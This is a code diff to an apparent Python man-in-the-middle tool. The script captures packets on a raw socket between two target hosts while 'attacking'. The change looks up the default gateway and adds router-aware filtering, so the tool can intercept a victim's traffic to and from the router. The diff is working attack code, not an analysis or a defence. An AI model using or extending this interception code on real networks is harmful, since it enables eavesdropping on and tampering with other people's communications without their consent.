@@ -18,6 +18,11 @@ ifconfig_info = subprocess.check_output(['ifconfig']).decode('utf-8')
 print(ifconfig_info)
 net_device = input('Select network device: ')
 
+# Get default gateway (router ip)
+ip_routes = subprocess.check_output(['ip', 'route', 'show']).decode('utf-8')
+regex = r'default via ([0-9.]+) dev ' + net_device
+router_ip = re.findall(regex, ip_routes)[0]
+
 # Prompts for host IP's
 ip1_unpacked = input("Host1's IP: ")
 ip2_unpacked = input("Host2's IP: ")
@@ -96,6 +101,9 @@ def listen_to_incoming_packets(Host_One_IP, Host_Two_IP,
     H1_MAC_unp = unpack('>6s', Host_One_MAC)[0]
     H2_MAC_unp = unpack('>6s', Host_Two_MAC)[0]
 
+    H1_is_router = (Host_One_IP == router_ip)
+    H2_is_router = (Host_Two_IP == router_ip)
+
     while attacking:
         packet = s.recvfrom(65565)
         packet = packet[0]
@@ -144,14 +152,19 @@ def listen_to_incoming_packets(Host_One_IP, Host_Two_IP,
             ip_header_length = (unpacked_iph[0] & 0xF) * 4
             srcIP = socket.inet_ntoa(unpacked_iph[8])
             dstIP = socket.inet_ntoa(unpacked_iph[9])
-            srcIP_obj = ipaddress.ip_address(srcIP)
-            dstIP_obj = ipaddress.ip_address(dstIP)
 
             # Checks on IP
-            is_global = srcIP_obj.is_global and dstIP_obj.is_global
-            is_multi = srcIP_obj.is_multicast or dstIP_obj.is_multicast
             dst_not_me = (dstIP != my_ip)
-            ip_ok = not is_global and not is_multi and dst_not_me
+            # Router logic
+            if H1_is_router:
+                vic_ip_in = (srcIP == Host_Two_IP or dstIP == Host_Two_IP)
+            elif H2_is_router:
+                vic_ip_in = (srcIP == Host_One_IP or dstIP == Host_One_IP)
+            else:
+                first = (srcIP == Host_One_IP and dstIP == Host_Two_IP)
+                second = (srcIP == Host_Two_IP and dstIP == Host_One_IP)
+                vic_ip_in = (first or second)
+            ip_ok = vic_ip_in and dst_not_me
             # Checks on MAC and broadcast
             dst_not_bcast = (dstIP != '255.255.255.255' and dstIP != '0.0.0.0')
             src_not_bcast = (srcIP != '255.255.255.255' and srcIP != '0.0.0.0')
